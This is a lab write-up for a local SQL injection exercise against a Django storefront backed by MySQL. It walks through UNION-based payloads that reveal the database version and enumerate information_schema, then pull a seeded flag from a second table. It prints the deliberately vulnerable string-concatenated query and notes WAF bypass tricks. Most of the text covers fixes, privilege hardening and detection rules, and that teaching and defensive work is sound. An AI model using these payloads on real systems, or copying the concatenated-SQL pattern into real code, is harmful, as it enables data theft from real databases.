# Lab 04 — SQL injection: querying the database type and version on MySQL and Microsoft

## 1. Lab overview

| Field | Value |
| --- | --- |
| PortSwigger reference | <https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft> |
| Lab id | `psw-sqli-04-mysql-mssql-version` |
| Vulnerability class | SQL Injection — UNION-based information disclosure (DBMS version) |
| CWE | [CWE-89 — Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html) |
| Backend | MySQL 8.4 (the payload shape below is identical for Microsoft SQL Server) |
| Host URL | <http://127.0.0.1:18004/> |
| Flag | `FLAG{psw-sqli-04-mysql-mssql-version-revealed}` |

### Objective

The storefront exposes a category filter that pastes its query-string parameter into a hand-built `SELECT` over the `products` table. The learner must append a `UNION SELECT` that projects MySQL's `@@version` system variable — or `@@version` on Microsoft SQL Server — into one of the returned columns. Once a row containing a DBMS banner (e.g. `8.4.x` / `Microsoft SQL Server 2019 ...`) shows up in the listing, the solve detector also recognises the seeded `FLAG{...}` value and marks the lab complete.

---

## 2. Exploit walkthrough

The vector is the `category` query parameter on `GET /filter`. The MySQL inline comment token is `-- ` (dash-dash-space) **or** `#` — on the wire that means either URL-encoding the trailing space (`--+` / `--%20`) or substituting `%23` for `#`.

**Step 1 — baseline request (benign)**

```http
GET /filter?category=Gifts HTTP/1.1
Host: 127.0.0.1:18004
```

The server runs:

```sql
SELECT id, name, category, description, price, released
FROM products
WHERE category = 'Gifts' AND released = 1
```

Three "Gifts" rows come back. The page also echoes the composed SQL in an `executed_sql` panel, which makes the column count obvious: six.

**Step 2 — match the column count with a UNION probe**

Before dumping `@@version`, the UNION halves must agree on column count and on column types that tolerate a string. With six columns:

```
/filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL,NULL,NULL,NULL--+
```

Decoded:

```sql
SELECT id, name, category, description, price, released
FROM products
WHERE category = 'Gifts' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ' AND released = 1
```

If the page renders without a database error, column count is confirmed.

**Step 3 — project `@@version` into a string column**

MySQL is permissive about mixing types in a UNION, so the banner can simply replace one of the `NULL`s:

```
/filter?category=Gifts'+UNION+SELECT+NULL,@@version,NULL,NULL,NULL,NULL--+
```

Resulting SQL:

```sql
SELECT id, name, category, description, price, released
FROM products
WHERE category = 'Gifts' UNION SELECT NULL,@@version,NULL,NULL,NULL,NULL-- ' AND released = 1
```

A row appears whose `name` column is the server version string (e.g. `8.4.0`). The `_contains_dbms_banner` regex in the view fires on `MySQL` / `MariaDB` / `Microsoft SQL Server` substrings or bare `X.Y.Z` version numbers.

**Step 4 — pivot to the seeded flag table**

The visible banner answers the PortSwigger challenge, but this lab also ships a dedicated `flags` table (see [shop/models.py:22-38](shop/models.py#L22-L38)). Enumerating `information_schema` and pulling the flag finishes the solve:

```
/filter?category=Gifts'+UNION+SELECT+NULL,table_name,NULL,NULL,NULL,NULL+FROM+information_schema.tables+WHERE+table_schema=database()--+
```

then

```
/filter?category=Gifts'+UNION+SELECT+NULL,content,NULL,NULL,NULL,NULL+FROM+flags--+
```

The rendered row now contains `FLAG{psw-sqli-04-mysql-mssql-version-revealed}`, which `_first_flag` surfaces and the template stamps as "solved".

**Step 5 — Microsoft SQL Server variant**

Against MSSQL the same payload works with `@@version` unchanged; the comment token is `--` (no trailing-space requirement). `@@version` on MSSQL returns the full product banner including edition and OS build, so column-type coercion (a `CAST(@@version AS varchar)`) is usually unnecessary.

---

## 3. Vulnerable code

### Endpoint: `GET /filter`

[shop/views.py:68-75](shop/views.py#L68-L75)

```python
def filter_products(request: HttpRequest) -> HttpResponse:
    category = request.GET.get("category", "")

    query = (
        "SELECT id, name, category, description, price, released "
        "FROM products "
        "WHERE category = '" + category + "' AND released = 1"
    )
```

Three defects stack:

1. `category` is taken straight from `request.GET` with no validation, no allow-list, no length cap.
2. It is concatenated into a raw SQL string — the query text is *built* from untrusted input rather than *parameterised*.
3. The only syntactic boundary is a literal single quote in the template string, which any `'` plus `-- ` or `#` from the attacker closes and escapes.

[shop/views.py:80-87](shop/views.py#L80-L87)

```python
    try:
        with connection.cursor() as cursor:
            cursor.execute(query)
            columns = [col[0].lower() for col in cursor.description]
            for row in cursor.fetchall():
                rows.append(dict(zip(columns, row)))
    except Exception as exc:
        error = f"Database error: {exc}"
```

`cursor.execute(query)` is called with a single pre-built string and no `params` argument, so the MySQL driver has no way to distinguish the intended query from attacker-supplied tokens. The `except Exception` branch reflects the raw MySQL error back to the page, which accelerates exploitation (column-count mismatches, type errors and schema names all leak through it).

### Route registration

[shop/urls.py:5-8](shop/urls.py#L5-L8) — `/filter` is the only sink; `home` uses the ORM and is not vulnerable.

### Supporting model

[shop/models.py:4-19](shop/models.py#L4-L19) — the `Product` model maps to `db_table = "products"`, the same table name that is hard-coded into the concatenated SQL.

[shop/models.py:22-38](shop/models.py#L22-L38) — the dedicated `Flag` model is never referenced by any view. The only way a request can reach its `content` column is through a `UNION SELECT ... FROM flags` (or via `information_schema`).

### Seeded data

[shop/management/commands/seed.py:14](shop/management/commands/seed.py#L14) — the flag string.
[shop/management/commands/seed.py:45-46](shop/management/commands/seed.py#L45-L46) — the flag is inserted into the `flags` table, proving the attacker must cross into a second table to retrieve it.

### Backend wiring

[sqli_lab/settings.py:48-60](sqli_lab/settings.py#L48-L60) — `ENGINE = django.db.backends.mysql`, so `@@version` resolves to the MySQL server version at runtime.

[docker-compose.yml:4-12](docker-compose.yml#L4-L12) — the database is `mysql:8.4`. The web container talks to it over a private bridge network at `docker-compose.yml:59-62`.

---

## 4. Why the vulnerability exists

| Root cause | Effect |
| --- | --- |
| **String concatenation of untrusted input into SQL** | The driver cannot separate code from data; attacker quotes and `UNION`/`--`/`#` tokens rewrite the statement. |
| **No allow-list or type check on `category`** | Any byte sequence reaches the query, including MySQL-specific tokens (`@@version`, `INFORMATION_SCHEMA`, `INTO OUTFILE`, `#`). |
| **Raw MySQL errors echoed to the client** | Column-count mismatches, type coercion failures and schema names leak, turning blind-SQLi into near-error-based SQLi. |
| **`executed_sql` reflected in the response** | The learner sees the exact concatenated query — in a real app this removes every obstacle to crafting the payload. |
| **Second-table secret reachable from the same query** | A single injection point can pivot from `products` to `flags` and to `information_schema`, because the DB user can see all three. |
| **DEBUG mode on** (`settings.py:16`) | Django's debug pages would leak stack traces, environment variables and settings on any uncaught exception. |

---

## 5. Code-level mitigation

### 5.1 Parameterise the query

The minimum change keeps the hand-written SQL but binds `category` as data:

```python
# shop/views.py — fixed
def filter_products(request: HttpRequest) -> HttpResponse:
    category = request.GET.get("category", "")

    query = (
        "SELECT id, name, category, description, price, released "
        "FROM products "
        "WHERE category = %s AND released = 1"
    )
    with connection.cursor() as cursor:
        cursor.execute(query, [category])   # NOTE the list argument
        rows = cursor.fetchall()
```

With the value bound, `Gifts' UNION SELECT @@version...` is matched literally against the `category` column — nothing matches and the result set is empty.

### 5.2 Replace raw SQL with the ORM

The canonical Django idiom avoids `cursor.execute` entirely:

```python
from .models import Product

def filter_products(request: HttpRequest) -> HttpResponse:
    category = request.GET.get("category", "")
    products = (
        Product.objects
        .filter(category=category, released=True)
        .values("id", "name", "category", "description", "price", "released")
    )
```

Django's query compiler always binds parameters via the DB-API and also eliminates the duplicated `released = 1` predicate from a template string.

### 5.3 Validate against a known taxonomy

Categories are drawn from a tiny enumerable set ([shop/management/commands/seed.py:17-28](shop/management/commands/seed.py#L17-L28)). Reject unknown values before the query runs:

```python
ALLOWED_CATEGORIES = {"Accessories", "Tech", "Lifestyle", "Gifts", "Pets", "Clothing"}

def filter_products(request):
    category = request.GET.get("category", "")
    if category not in ALLOWED_CATEGORIES:
        return HttpResponseBadRequest("unknown category")
    ...
```

This is defence-in-depth on top of parameterisation: it prevents even well-formed nonsense from reaching the DB and removes any room for character-set or collation trickery (`utf8mb4` plus MySQL's loose implicit casts can surprise you).

### 5.4 Suppress error and SQL echo

- Drop the `executed_sql` key from the context and the corresponding template block; never render composed SQL in user-visible responses.
- Replace `except Exception as exc: error = f"Database error: {exc}"` with a generic 500 page and a structured log entry. On MySQL the exception message leaks column counts, type names and, via `information_schema` errors, database names.
- Set `DEBUG = False` outside the learning context (`sqli_lab/settings.py:16`).

### 5.5 Harden the banner itself

`@@version` is only one of many information-disclosure vectors; also relevant to this class of lab are `VERSION()`, `@@hostname`, `@@datadir`, `USER()`, `CURRENT_USER()`, `@@version_compile_os`. The only durable defence is "attacker never controls the query" — blocking individual keywords is whack-a-mole.

### 5.6 Deny the MySQL/MSSQL features that turn SQLi into RCE or file read

Even with the query fixed, assume another injection appears tomorrow. Deny the riskiest primitives at the DB layer:

- **MySQL**: revoke `FILE` privilege — this neuters `INTO OUTFILE`, `INTO DUMPFILE` and `LOAD_FILE`. Set `--secure-file-priv=/dev/null` (empty-string in `my.cnf`) to disable file I/O outright. Do not grant `SUPER`. Disable `LOCAL INFILE` on the client driver.
- **MSSQL**: `xp_cmdshell` must be disabled (`sp_configure 'xp_cmdshell', 0`). Remove `xp_dirtree`, `xp_fileexist`, `OPENROWSET`/`OPENDATASOURCE` from the application role. Deny `CONTROL SERVER`; assign only the minimum `db_datareader` / `db_datawriter` where required. `CLR` integration and `Ole Automation Procedures` should be off.

---

## 6. Network / infrastructure-level mitigation

### 6.1 Web Application Firewall (WAF)

Deploy a WAF (Cloud provider managed rules, ModSecurity with OWASP CRS, or similar). The high-signal CRS rules for this lab:

- `REQUEST-942` — SQL injection detection (matches `UNION SELECT`, `@@version`, `information_schema`, stacked `--` / `#` comments).
- `REQUEST-920` — protocol enforcement (rejects oversized query strings, non-UTF-8 byte sequences, malformed URL encoding used for bypass).
- `REQUEST-932` — command-injection detection (covers `xp_cmdshell` payloads).

A WAF is **one** layer — CRS can be bypassed with inline comments (`/*!50000UNION*/ SELECT`), whitespace substitution (`%09`, `%0b`), and nested encodings. Treat it as a tripwire and alerting surface, not a cure.

### 6.2 Least-privilege database account

The Compose file currently wires the web container to `labuser` ([docker-compose.yml:44-46](docker-compose.yml#L44-L46)). In production, that account should have:

- `SELECT` on `products` only. No access to `flags`, no access to any non-application schema.
- `REVOKE PROCESS, FILE, SUPER, RELOAD, SHUTDOWN`.
- On MySQL specifically: no `SELECT` on `mysql.*` and only scoped `SELECT` on `information_schema` via `--skip-show-database` where operationally possible.
- On MSSQL: role membership limited to `db_datareader` for read-only endpoints; no `sysadmin`, no `db_owner`, no `SecurityAdmin`.

A single secret in a second table is a realistic pattern for API keys, session tokens and per-tenant configuration. If the app account cannot `SELECT * FROM flags`, the UNION payload hits a privilege error instead of disclosing data.

### 6.3 Network segmentation and egress control

- The MySQL service in [docker-compose.yml:29-30](docker-compose.yml#L29-L30) is reachable only on the internal Docker bridge — there is no host port mapping. Preserve that: never publish 3306 to `0.0.0.0`.
- The web container publishes only on `127.0.0.1:18004` ([docker-compose.yml:37-38](docker-compose.yml#L37-L38)). Loopback-only binding is the first line of defence for local labs.
- In production, block outbound connections from the DB tier. MySQL `INTO OUTFILE` can write to disk (often exploitable for webshell drop when the web root is shared); MSSQL `xp_cmdshell` plus unrestricted egress gives the attacker a reverse shell to the internet. Deny egress at the VPC / firewall level.

### 6.4 Monitoring, rate limiting and detection

- Log every 4xx/5xx and every SQL parse error. A burst of `You have an error in your SQL syntax` lines on `/filter` is a near-perfect SQLi canary.
- Alert on response bodies containing regex hits for DBMS banners (`mysql`, `mariadb`, `Microsoft SQL Server`, `@@version`) from endpoints that should never return them.
- Rate-limit `/filter` per client IP — automated tools (sqlmap, ghauri) fire thousands of probes in minutes.
- Enable MySQL `general_log` in pre-production and MSSQL Extended Events in production, and ship them to the SIEM. Queries starting with your application's `SELECT id, name, category, ...` prefix followed by a `UNION` are a trivial detection rule.

### 6.5 Build / deploy hardening

- Pin MySQL to a supported LTS (`mysql:8.4` is fine at time of writing). Subscribe to Oracle and Microsoft CVE feeds for the server version your app reports — the same `@@version` disclosure that solves this lab tells an attacker which unpatched CVEs to try.
- Run the DB with `--log-bin-trust-function-creators=0`, `--local-infile=0`, and, on MSSQL, `CLR enabled = 0`, `Ad Hoc Distributed Queries = 0`.
- Rotate DB credentials out of environment variables ([docker-compose.yml:8-12](docker-compose.yml#L8-L12)) into a secrets manager for any deployment that is not a throwaway lab.

---

## 7. Defense-in-depth checklist

- [ ] Parameterised queries everywhere — no `+`, `%`, or f-string SQL builders.
- [ ] Django ORM by default; raw `cursor.execute` is code-reviewed and parameterised.
- [ ] Input validated against an allow-list for enumerable fields such as `category`.
- [ ] Database error messages and composed SQL are never rendered to clients.
- [ ] `DEBUG = False` and `ALLOWED_HOSTS` scoped in any non-lab environment.
- [ ] Per-service DB account with `SELECT` only on the tables the feature needs.
- [ ] Secrets (`flags`, API keys, tenant tokens) stored in a schema the app account cannot read.
- [ ] `FILE` privilege revoked on MySQL; `xp_cmdshell` / `OPENROWSET` disabled on MSSQL.
- [ ] `LOCAL INFILE` disabled on the MySQL client driver.
- [ ] Database tier has no outbound internet egress.
- [ ] WAF with OWASP CRS in front of the application; CRS rules for UNION, `@@version`, `information_schema` tuned to alert.
- [ ] Structured logging of SQL errors with alerting on parse-error bursts.
- [ ] SAST (`bandit`, `semgrep`) configured to flag `cursor.execute("..." + x)` and `cursor.execute(f"...")` patterns.
- [ ] MySQL / MSSQL server versions tracked against CVE feeds; banners not needed by clients suppressed at the proxy.

---

## 8. References

- PortSwigger Web Security Academy — [SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)
- OWASP — [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- CWE-89 — <https://cwe.mitre.org/data/definitions/89.html>
- MySQL — [Server System Variables: `version`](https://dev.mysql.com/doc/refman/8.4/en/server-system-variables.html#sysvar_version) and [INFORMATION_SCHEMA reference](https://dev.mysql.com/doc/refman/8.4/en/information-schema.html)
- Microsoft — [`@@VERSION` (Transact-SQL)](https://learn.microsoft.com/en-us/sql/t-sql/functions/version-transact-sql-configuration-functions) and [`xp_cmdshell` Server Configuration Option](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)
- Django docs — [Executing custom SQL directly](https://docs.djangoproject.com/en/5.0/topics/db/sql/#executing-custom-sql-directly)
- OWASP CRS — <https://coreruleset.org/>
